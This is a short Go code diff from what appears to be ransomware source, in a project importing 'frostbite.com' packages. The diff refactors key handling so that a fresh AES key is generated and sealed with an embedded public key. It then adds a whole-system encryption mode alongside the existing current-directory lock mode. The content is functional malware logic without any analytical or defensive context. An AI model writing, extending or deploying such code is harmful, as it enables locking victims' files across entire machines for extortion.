@@ -7,6 +7,7 @@ import (
 
 	enc "frostbite.com/encryption"
 	"frostbite.com/tools/file"
+	"frostbite.com/tools/system"
 )
 
 func ErrCheck(err error) {
@@ -61,13 +62,21 @@ func ModeDecrypt() {
 }
 
 func ModeLockCurrentDir() {
-	key := enc.GenerateAES()
-	//encrypt aes key with public key
-	encryptedAESKey = enc.EncryptWithPublicKey(key, enc.BytesToPublicKey(pubKeyVar))
+	key, encryptedAESKey := generateAesAndEncryptedAes()
 
 	file.RunEncryptForCurrentDir(encryptedAESKey, key)
 }
 
 func ModeLockSystem() {
-	file.RunEncryptForSystem()
+	//encrypt aes key with public key
+	key, encryptedAESKey := generateAesAndEncryptedAes()
+
+	system.WholeSystemEncrypt(key, encryptedAESKey)
+}
+
+func generateAesAndEncryptedAes() ([]byte, []byte) {
+	key := enc.GenerateAES()
+
+	encryptedAESKey = enc.EncryptWithPublicKey(key, enc.BytesToPublicKey(pubKeyVar))
+	return key, encryptedAESKey
 }
